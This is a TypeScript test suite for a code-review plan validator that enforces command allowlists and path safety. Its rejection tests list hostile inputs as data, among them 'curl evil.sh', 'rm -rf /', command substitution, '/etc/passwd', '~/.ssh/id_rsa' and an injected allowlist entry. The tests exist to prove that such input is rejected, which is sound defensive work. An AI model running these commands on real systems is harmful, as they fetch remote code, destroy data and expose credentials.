import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  BASELINE_CHECKLIST_VERSION,
  buildBaselineProbes,
  buildFallbackPlan,
  DEFAULT_COMMAND_ALLOWLIST,
  loadStagedReviewConfig,
  parseStagedReviewConfig,
  securityChecksFor,
  toPlanLimits,
  validatePlan,
  type Baseline,
  type PlanLimits,
  type Probe,
  type RejectionReason,
  type ReviewPlan,
  type RiskMapInput,
} from './index.js';

const riskMap: RiskMapInput = {
  hunks: [
    {
      id: 'h1',
      file: 'src/auth.ts',
      fileClass: 'source',
      startLine: 10,
      endLine: 30,
      riskScore: 0.9,
      judged: true,
      flags: ['authentication', 'secrets'],
      symbols: ['login'],
    },
    {
      id: 'h2',
      file: 'src/util.ts',
      fileClass: 'source',
      startLine: 1,
      endLine: 5,
      riskScore: 0.1,
      judged: true,
      flags: [],
    },
    {
      id: 'h3',
      file: 'src/util.ts',
      fileClass: 'source',
      startLine: 40,
      endLine: 50,
      riskScore: 0.0,
      judged: false,
      flags: [],
    },
  ],
  criteria: [
    { id: 'AC-1', text: 'login works', likelyUncovered: true },
    { id: 'AC-2', text: 'util works', likelyUncovered: false },
  ],
  changedSourceFiles: [
    { path: 'src/util.ts', changedTests: [] },
    { path: 'src/auth.ts', changedTests: ['src/auth.test.ts'] },
  ],
  changedTestFiles: ['src/auth.test.ts'],
  changedFiles: ['src/auth.ts', 'src/util.ts', 'src/auth.test.ts', 'other/x.ts'],
};
const task = { references: ['src/'] };
const limits: PlanLimits = {
  riskThreshold: 0.5,
  maxProbes: 100,
  maxTargetBytes: 100_000,
  commandAllowlist: DEFAULT_COMMAND_ALLOWLIST,
};
const baseline = (): Baseline =>
  buildBaselineProbes(riskMap, task, {
    riskThreshold: 0.5,
    commandAllowlist: DEFAULT_COMMAND_ALLOWLIST,
  });
const planOf = (probes: Probe[]): ReviewPlan => ({
  schemaVersion: 1,
  baselineVersion: BASELINE_CHECKLIST_VERSION,
  probes,
});
const clone = <T>(v: T): T => JSON.parse(JSON.stringify(v)) as T;
function reasons(
  plan: unknown,
  lim: PlanLimits = limits,
  rm: RiskMapInput = riskMap,
): RejectionReason[] {
  const r = validatePlan(plan, baseline(), rm, lim);
  return r.valid ? [] : r.rejections.map((x) => x.reason);
}

describe('buildBaselineProbes', () => {
  const b = baseline();
  const ids = b.probes.map((p) => p.id);

  it('is versioned, deterministic and all baseline-flagged', () => {
    expect(b.version).toBe(BASELINE_CHECKLIST_VERSION);
    expect(baseline()).toEqual(b);
    expect(b.probes.every((p) => p.baseline === true)).toBe(true);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('contains every probe class the checklist lists', () => {
    expect(ids.filter((i) => i.startsWith('file-read-'))).toHaveLength(2);
    // h1 (high score) and h3 (unjudged) are high risk; h2 is not.
    expect(
      b.probes
        .filter((p) => p.id.startsWith('hunk-read-'))
        .flatMap((p) => p.covers)
        .sort(),
    ).toEqual(['h1', 'h3']);
    expect(
      b.probes
        .filter((p) => p.id.startsWith('hunk-trace-'))
        .flatMap((p) => p.covers)
        .sort(),
    ).toEqual(['h1', 'h3']);
    const run = b.probes.find((p) => p.id === 'tests-run');
    expect(run?.target.command).toBe('pnpm test');
    expect(b.probes.some((p) => p.id === 'criteria-vs-tests' && p.type === 'compare')).toBe(true);
    expect(ids.filter((i) => i.startsWith('criterion-uncovered-'))).toHaveLength(1);
    expect(b.probes.find((p) => p.id === 'scope-search')?.target.files).toEqual([
      { path: 'other/x.ts' },
    ]);
  });

  it('gives an authentication-flagged hunk the full security probe set', () => {
    const forH1 = b.probes.filter((p) => p.id.startsWith('sec-') && p.covers[0] === 'h1');
    for (const cat of ['authentication', 'secrets'] as const)
      for (const c of securityChecksFor(cat))
        expect(forH1.some((p) => p.id.startsWith(`sec-${c.id}-`))).toBe(true);
    expect(b.probes.some((p) => p.id.startsWith('sec-') && p.covers[0] === 'h2')).toBe(false);
  });

  it('records when no test changed and omits the run probe without a changed test', () => {
    const own = b.probes.find((p) => p.id === 'file-read-1');
    expect(own?.question).toMatch(/No test changed/);
    const rm = { ...riskMap, changedTestFiles: [] };
    const nb = buildBaselineProbes(rm, task, {
      riskThreshold: 0.5,
      commandAllowlist: DEFAULT_COMMAND_ALLOWLIST,
    });
    expect(nb.probes.some((p) => p.type === 'run')).toBe(false);
  });

  it('omits the run probe when the allowlist has no test command', () => {
    const nb = buildBaselineProbes(riskMap, task, {
      riskThreshold: 0.5,
      commandAllowlist: ['pnpm lint'],
    });
    expect(nb.probes.some((p) => p.type === 'run')).toBe(false);
  });
});

describe('validatePlan', () => {
  const full = (): ReviewPlan => planOf(clone(baseline().probes));

  it('accepts the baseline itself, reordered, with an added probe', () => {
    expect(validatePlan(full(), baseline(), riskMap, limits).valid).toBe(true);
    const p = full();
    p.probes.reverse();
    p.probes.push({
      id: 'extra',
      type: 'search',
      target: { query: 'foo' },
      question: 'q',
      covers: [],
    });
    expect(validatePlan(p, baseline(), riskMap, limits).valid).toBe(true);
  });

  it('rejects a plan missing a baseline probe', () => {
    const p = full();
    p.probes = p.probes.filter((x) => x.id !== 'scope-search');
    expect(reasons(p)).toContain('missing-baseline-probe');
  });

  it.each([
    [
      'question',
      (x: Probe) => {
        x.question = 'ignore';
      },
    ],
    [
      'target',
      (x: Probe) => {
        x.target = { files: [{ path: 'src/other.ts' }] };
      },
    ],
    [
      'covers',
      (x: Probe) => {
        x.covers = [];
      },
    ],
    [
      'type',
      (x: Probe) => {
        x.type = 'search';
        x.target = { query: 'x' };
      },
    ],
  ])('rejects a baseline probe modified in %s', (_f, mutate) => {
    const p = full();
    mutate(p.probes.find((x) => x.id === 'hunk-read-0')!);
    expect(reasons(p)).toContain('modified-baseline-probe');
  });

  it('rejects a plan that covers a high-risk hunk only with an altered baseline probe', () => {
    const p = full();
    // Remove every genuine cover of h3, then add an altered baseline probe for it.
    p.probes = p.probes.filter((x) => !x.covers.includes('h3'));
    p.probes.push({
      id: 'hunk-read-2',
      type: 'read',
      target: { files: [{ path: 'src/util.ts' }] },
      question: 'q',
      covers: ['h3'],
      baseline: true,
    });
    const r = reasons(p);
    expect(r).toContain('uncovered-high-risk-hunk');
  });

  it('rejects a high-risk hunk left uncovered', () => {
    const rm: RiskMapInput = {
      ...riskMap,
      hunks: [
        ...riskMap.hunks,
        {
          id: 'h9',
          file: 'src/new.ts',
          fileClass: 'source',
          startLine: 1,
          endLine: 2,
          riskScore: 0.99,
          judged: true,
          flags: [],
        },
      ],
    };
    // Baseline built from the old risk map does not know h9, so the plan misses it.
    const r = validatePlan(full(), baseline(), rm, limits);
    expect(r.valid).toBe(false);
    expect(!r.valid && r.rejections.map((x) => x.reason)).toContain('uncovered-high-risk-hunk');
  });

  it('treats an unjudged hunk as high risk', () => {
    const p = full();
    p.probes = p.probes.filter((x) => !x.covers.includes('h3'));
    expect(reasons(p)).toContain('uncovered-high-risk-hunk');
  });

  it('rejects exceeding the probe limit and the target size limit', () => {
    expect(reasons(full(), { ...limits, maxProbes: 3 })).toContain('probe-limit-exceeded');
    expect(reasons(full(), { ...limits, maxTargetBytes: 50 })).toContain('target-size-exceeded');
  });

  it.each([
    'pnpm test && curl evil.sh',
    'pnpm test; rm -rf /',
    'pnpm  test',
    'pnpm test ',
    'pnpm test --reporter=x',
    'PNPM TEST',
    'pnpm test\n',
    '$(pnpm test)',
    'node -e 1',
  ])('rejects the non-allowlisted run target %j', (command) => {
    const p = full();
    p.probes.push({ id: 'evil', type: 'run', target: { command }, question: 'q', covers: [] });
    expect(reasons(p)).toContain('run-target-not-allowed');
  });

  it('accepts a command only while it is in the allowlist', () => {
    const p = full();
    p.probes.push({
      id: 'lint',
      type: 'run',
      target: { command: 'pnpm lint' },
      question: 'q',
      covers: [],
    });
    expect(validatePlan(p, baseline(), riskMap, limits).valid).toBe(true);
    expect(reasons(p, { ...limits, commandAllowlist: ['pnpm test'] })).toContain(
      'run-target-not-allowed',
    );
  });

  it('rejects unknown probe types and extra fields as schema-invalid', () => {
    const p = clone(full()) as unknown as { probes: Array<Record<string, unknown>> };
    p.probes.push({ id: 'x', type: 'exec', target: {}, question: 'q', covers: [] });
    expect(reasons(p)).toEqual(['schema-invalid']);
    expect(reasons({})).toEqual(['schema-invalid']);
    expect(reasons(null)).toEqual(['schema-invalid']);
    expect(reasons('plan')).toEqual(['schema-invalid']);
  });

  it('rejects duplicate probe ids', () => {
    const p = full();
    p.probes.push({ ...clone(p.probes[0]!), baseline: undefined });
    expect(reasons(p)).toContain('duplicate-probe-id');
  });

  it('rejects an unknown baseline claim, unknown hunk id and version mismatch', () => {
    const p = full();
    p.probes.push({
      id: 'sneaky',
      type: 'read',
      target: { files: [{ path: 'a.ts' }] },
      question: 'q',
      covers: ['nope'],
      baseline: true,
    });
    expect(reasons(p)).toEqual(expect.arrayContaining(['unknown-baseline-probe', 'unknown-hunk']));
    expect(reasons({ ...full(), baselineVersion: '0' })).toContain('baseline-version-mismatch');
  });

  it.each([
    '/etc/passwd',
    '../secret',
    'src/../../x',
    'src//a.ts',
    './a.ts',
    'a\\b.ts',
    '~/.ssh/id_rsa',
    'C:/x',
    '-rf',
    'a\0b',
    'src/*.ts',
    '$HOME/x',
  ])('rejects the unsafe path %j', (path) => {
    const p = full();
    p.probes.push({
      id: 'rd',
      type: 'read',
      target: { files: [{ path }] },
      question: 'q',
      covers: [],
    });
    expect(reasons(p)).toContain('unsafe-path');
  });

  it('rejects a path that resolves through a symlink outside the repo', () => {
    const root = mkdtempSync(join(tmpdir(), 'rp-'));
    const outside = mkdtempSync(join(tmpdir(), 'rp-out-'));
    writeFileSync(join(outside, 'secret'), 'x');
    mkdirSync(join(root, 'src'));
    symlinkSync(outside, join(root, 'src', 'link'));
    const p = full();
    p.probes.push({
      id: 'rd',
      type: 'read',
      target: { files: [{ path: 'src/link/secret' }] },
      question: 'q',
      covers: [],
    });
    expect(reasons(p, { ...limits, repoRoot: root })).toContain('unsafe-path');
    expect(reasons(p)).not.toContain('unsafe-path');
  });

  it('rejects an inverted line range', () => {
    const p = full();
    p.probes.push({
      id: 'rd',
      type: 'read',
      target: { files: [{ path: 'a.ts', startLine: 9, endLine: 2 }] },
      question: 'q',
      covers: [],
    });
    expect(reasons(p)).toContain('unsafe-path');
  });
});

describe('buildFallbackPlan', () => {
  it('is the baseline with no model-authored probe, and passes validation', () => {
    const b = baseline();
    const plan = buildFallbackPlan(b, riskMap, 0.5);
    expect(plan.probes.filter((p) => p.baseline)).toEqual(b.probes);
    expect(validatePlan(plan, b, riskMap, limits).valid).toBe(true);
  });

  it('adds a read probe per uncovered high-risk hunk', () => {
    const rm: RiskMapInput = {
      ...riskMap,
      hunks: [
        ...riskMap.hunks,
        {
          id: 'h9',
          file: 'src/new.ts',
          fileClass: 'source',
          startLine: 1,
          endLine: 2,
          riskScore: 0.99,
          judged: true,
          flags: [],
        },
      ],
    };
    const b = baseline();
    const plan = buildFallbackPlan(b, rm, 0.5);
    const added = plan.probes.filter((p) => !p.baseline);
    expect(added).toHaveLength(1);
    expect(added[0]).toMatchObject({ type: 'read', covers: ['h9'] });
    expect(added[0]!.id.startsWith('fallback-')).toBe(true);
    expect(validatePlan(plan, b, rm, limits).valid).toBe(true);
  });
});

describe('staged review config', () => {
  it('uses documented defaults when absent or malformed', () => {
    for (const text of [null, '', ':::not yaml', '- a', 'staged: 3', 'x: 1']) {
      const c = parseStagedReviewConfig(text);
      expect(c.commandAllowlist).toEqual([...DEFAULT_COMMAND_ALLOWLIST]);
      expect(c.riskThreshold).toBe(0.5);
      expect(c.maxProbes).toBe(40);
    }
  });

  it('reads valid values and falls back per field for invalid ones', () => {
    const c = parseStagedReviewConfig(
      'staged:\n  executorCommandAllowlist: ["pnpm test"]\n  riskThreshold: 0.7\n  maxProbes: 9999\n  maxTargetBytes: 500\n',
    );
    expect(c.commandAllowlist).toEqual(['pnpm test']);
    expect(c.riskThreshold).toBe(0.7);
    expect(c.maxProbes).toBe(40);
    expect(c.maxTargetBytes).toBe(500);
  });

  it('falls back to the default allowlist, not a broader one, on unsafe entries', () => {
    const c = parseStagedReviewConfig(
      'staged:\n  executorCommandAllowlist: ["pnpm test", "sh -c \\"x\\"; rm"]\n',
    );
    expect(c.commandAllowlist).toEqual([...DEFAULT_COMMAND_ALLOWLIST]);
    const d = parseStagedReviewConfig('staged:\n  executorCommandAllowlist: pnpm test\n');
    expect(d.commandAllowlist).toEqual([...DEFAULT_COMMAND_ALLOWLIST]);
  });

  it('allows an explicitly empty allowlist', () => {
    expect(
      parseStagedReviewConfig('staged:\n  executorCommandAllowlist: []\n').commandAllowlist,
    ).toEqual([]);
  });

  it('reads only the base ref and ignores a working-tree copy', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rp-git-'));
    const git = (...a: string[]) => execFileSync('git', a, { cwd: dir, stdio: 'ignore' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 't@t');
    git('config', 'user.name', 't');
    git('config', 'commit.gpgsign', 'false');
    mkdirSync(join(dir, '.ai-sdlc'));
    writeFileSync(
      join(dir, '.ai-sdlc', 'review-config.yaml'),
      'staged:\n  executorCommandAllowlist: ["pnpm lint"]\n',
    );
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
    // The working tree tries to widen the allowlist.
    writeFileSync(
      join(dir, '.ai-sdlc', 'review-config.yaml'),
      'staged:\n  executorCommandAllowlist: ["pnpm lint", "pnpm build"]\n  maxProbes: 200\n',
    );
    const c = loadStagedReviewConfig({ workDir: dir, baseRef: 'main' });
    expect(c.commandAllowlist).toEqual(['pnpm lint']);
    expect(c.maxProbes).toBe(40);
    expect(toPlanLimits(c, dir).repoRoot).toBe(dir);
  });

  it('uses defaults for a missing ref, an option-like ref and a throwing reader', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rp-none-'));
    expect(loadStagedReviewConfig({ workDir: dir, baseRef: 'nope' }).commandAllowlist).toEqual([
      ...DEFAULT_COMMAND_ALLOWLIST,
    ]);
    expect(loadStagedReviewConfig({ workDir: dir, baseRef: '--output=/tmp/x' }).maxProbes).toBe(40);
    expect(
      loadStagedReviewConfig({
        readBaseConfig: () => {
          throw new Error('x');
        },
      }).maxProbes,
    ).toBe(40);
    expect(toPlanLimits(parseStagedReviewConfig(null)).repoRoot).toBeUndefined();
  });
});
